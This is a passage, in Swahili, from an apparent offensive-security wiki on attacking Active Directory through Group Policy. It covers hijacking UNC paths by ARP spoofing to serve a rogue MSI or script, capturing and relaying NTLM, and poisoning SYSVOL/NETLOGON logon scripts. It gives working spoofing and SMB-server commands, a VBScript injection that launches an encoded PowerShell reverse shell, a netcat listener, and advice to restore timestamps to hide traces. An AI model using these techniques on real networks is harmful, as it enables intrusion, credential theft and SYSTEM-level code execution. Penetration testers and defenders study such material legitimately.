Ikiwa GPO iliyounganishwa itasambaza MSI kutoka kwenye njia ya UNC, client itaipakua wakati wa **computer startup** na kuisakinisha kama **`NT AUTHORITY\SYSTEM`**. Kwa ku-spoof host iliyorejelewa na kutoa MSI hasidi chini ya **share/path/name** ileile, unaweza kubadilisha `WriteGPLink` kuwa utekelezaji wa code kama SYSTEM **bila kurekebisha SYSVOL**.

Vizuizi muhimu:

- **Muda ni muhimu**: link mpya huonekana wakati wa policy refresh (kwa kawaida baada ya takriban dakika 90), lakini **Software Installation** kwa kawaida huanzishwa wakati wa **reboot**.
- Windows Installer kwa kawaida hufuatilia usambazaji kwa kutumia **`ProductCode`** ya package. Ikiwa product tayari imesakinishwa, usambazaji unaweza kurukwa.
- Ili kuepuka kukataliwa na installer, rekebisha rogue MSI ili **`ProductCode`** na **`PackageCode`** zake zilingane na zile za package halali inayotarajiwa na GPO.
- Faili za zamani za matangazo za `.aas` zinaweza kubaki kwenye `SYSVOL`, kwa hivyo hakikisha kuwa usambazaji bado unaonekana kuwa active kabla ya kutegemea njia hii.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings katika `Drives.xml` husababisha watumiaji kuthibitisha utambulisho wao kwenye njia ya UNC iliyosanidiwa wakati wa kuingia au kuunganisha tena. Ukifanya spoof ya host inayorejelewa, unaweza kunasa **NetNTLMv2**. SMB ikifanywa ishindwe kimakusudi, Windows inaweza kujaribu tena kupitia **WebDAV**, na kutuma **NTLM kupitia HTTP**; njia hii ni rahisi zaidi kutumia kwa relays kwenda **LDAP(S)**, **AD CS**, au **SMB**.

#### Logon/startup script UNC hijack

Muundo huo huo unatumika kwa script zinazopangishwa kwenye UNC na kupatikana katika `SYSVOL`:

- **Logon scripts** kwa kawaida hutekelezwa katika muktadha wa **user**.
- **Startup scripts** kwa kawaida hutekelezwa katika muktadha wa **computer / SYSTEM**.

Ikiwa njia ya script inaelekeza kwenye hostname inayoweza kufanyiwa spoof, elekeza upya host ya UNC na utoe maudhui mbadala ya script kutoka eneo linalotarajiwa.

## SYSVOL/NETLOGON Logon Script Poisoning

Njia zinazoweza kuandikwa chini ya `\\<dc>\SYSVOL\<domain>\scripts\` au `\\<dc>\NETLOGON\` huruhusu kubadilisha logon scripts zinazotekelezwa wakati watumiaji wanaingia kupitia GPO. Hii husababisha utekelezaji wa code katika muktadha wa usalama wa watumiaji wanaoingia.

### Tafuta logon scripts
- Kagua attributes za watumiaji ili kuona kama kuna logon script iliyosanidiwa:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Crawl shares za domain ili kubaini shortcuts au marejeleo ya scripts:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Changanua faili za `.lnk` ili kubaini lengwa zinazoelekeza kwenye SYSVOL/NETLOGON (mbinu muhimu ya DFIR na kwa washambuliaji wasioweza kufikia GPO moja kwa moja):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound huonyesha attribute ya logon-script ya user object `scriptPath` inapokuwepo. Logon scripts zilizosanidiwa kupitia GPO ni marejeleo tofauti ya policy, kwa hivyo kagua pia GPO inayotumika.

### Thibitisha ruhusa ya kuandika (usiamini orodha za share)
Automated tooling inaweza kuonyesha SYSVOL/NETLOGON kuwa read-only hata kama script husika ina NTFS ACL tofauti. Anza kwa ukaguzi wa read-only wa faili hiyo na directory yake kuu; Allow ACEs zinazolingana bado zinaweza kuhusika kwa sababu ruhusa halisi za SMB na NTFS, Deny ACEs, na token ya sasa vyote vina umuhimu:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Jaribio la write lililoidhinishwa linapaswa kulenga target mahususi na liweze kutenduliwa, huku script ya awali ikiwa imehifadhiwa nakala na kurejeshwa. Usibadilishe script ya logon inayofanya kazi ili tu kujaribu access; write ikifaulu, inaweza kutekelezwa mtumiaji anayefuata anapoingia.

### Ingiza payload kwenye script ya logon ya VBScript kwa RCE
Ongeza command inayozindua PowerShell reverse shell (iunde kupitia revshells.com) na uhifadhi logic ya awali ili kuepuka kuvuruga utendakazi wa biashara:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Sikiliza kwenye host yako na usubiri interactive logon inayofuata:

```bash
rlwrap -cAr nc -lnvp 443
```

Maelezo:
- Utekelezaji hufanyika kwa kutumia token ya mtumiaji wa logging (si SYSTEM). Wigo ni kiungo cha GPO (OU, site, domain) kinachotumia script hiyo.
- Baada ya matumizi, rudisha maudhui na timestamps za awali ili kufanya usafi.


## References

- [1] [Kutumia vibaya ACLs/ACEs za Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Akaunti zenye upendeleo na Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Sasisho la Njia ya Mashambulizi ya ACL](https://wald0.com/?p=112)
- [4] [Enum ya ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Kuongeza upendeleo kwa kutumia ACLs katika Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Kuchanganua Upendeleo wa Active Directory na Akaunti Zenye Upendeleo](https://adsecurity.org/?p=3658)
- [7] [Kijenzi cha ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Operesheni za sifa za AD/UAC kutoka Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (uanachama wa kikundi)](https://www.samba.org/)
- [10] [HTB Puppy: Kutumia vibaya AD ACL, kuvunja Argon2 ya KeePassXC, na kusimbua DPAPI hadi kupata admin wa DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Kuteka Njia za UNC za GPO kwa Code Execution na NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: kutumia vibaya GPO za Active Directory kupitia NTLM relaying, na mengineyo](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU inatania? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: kutumia vibaya njia fiche za mashambulizi ya ACL katika Organizational Units za Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Kuiga huduma halali za Active Directory kwenye mtandao: kisa cha unyonyaji wa GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — Kuhama kati ya OU na kutumia vibaya ACL zilizorithiwa](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
